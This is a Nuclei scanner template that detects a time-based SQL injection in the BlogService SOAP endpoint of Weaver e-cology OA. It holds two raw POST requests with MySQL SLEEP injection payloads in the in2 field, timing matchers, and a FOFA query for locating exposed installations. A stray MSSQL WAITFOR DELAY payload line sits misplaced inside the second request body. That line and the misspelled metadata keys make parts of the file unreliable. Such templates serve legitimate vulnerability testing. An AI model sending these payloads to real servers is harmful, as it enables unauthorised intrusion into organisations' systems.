e-cology-BlogService-sql.yaml

id: e-cology-BlogService-sql

info:
  name: e-cology-BlogService-sql
  author: xinghe
  severity: high
  description: e-cology-BlogService-sql
  tags: sqli
  metadata:
    fofa-qeury: app="泛微-协同商务系统"||app="泛微-OA（e-cology）"
    veified: true
    max-request: 1

http:
  - raw:
      - |
        POST /services/BlogService HTTP/1.1
        Host: 
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        SOAPAction: 
        Content-Type: text/xml;charset=UTF-8
         
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.blog.weaver.com.cn">
           <soapenv:Header/>
           <soapenv:Body>
              <web:sendSubmitRemind>
                 <!--type: string-->
                 <web:in0>1</web:in0>
                 <!--type: string-->
                 <web:in1>2</web:in1>
                 <!--type: string-->
                 <web:in2>3' AND (SELECT 3686 FROM (SELECT(SLEEP(4)))KzVQ) AND 'WxlZ'='WxlZ</web:in2>
              </web:sendSubmitRemind>
           </soapenv:Body>
        </soapenv:Envelope>

      - |
        POST /services/BlogService HTTP/1.1
        Host: 
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        SOAPAction: 
        Content-Type: text/xml;charset=UTF-8
         
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.blog.weaver.com.cn">
           <soapenv:Header/>
           <soapenv:Body>
              <web:sendSubmitRemind>
                 <!--type: string-->
                 <web:in0>1</web:in0>
                 <!--type: string-->
                 <web:in1>2</web:in1>
                 <!--type: string-->
                 <web:in2>3' AND (SELECT 3686 FROM (SELECT(SLEEP(8)))KzVQ) AND 'WxlZ'='WxlZ</web:in2>
              </web:sendSubmitRemind>
           </soapenv:Body>
        </soapenv:Envelope>
                FileID=1';WAITFOR+DELAY'0:0:8'--+

    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and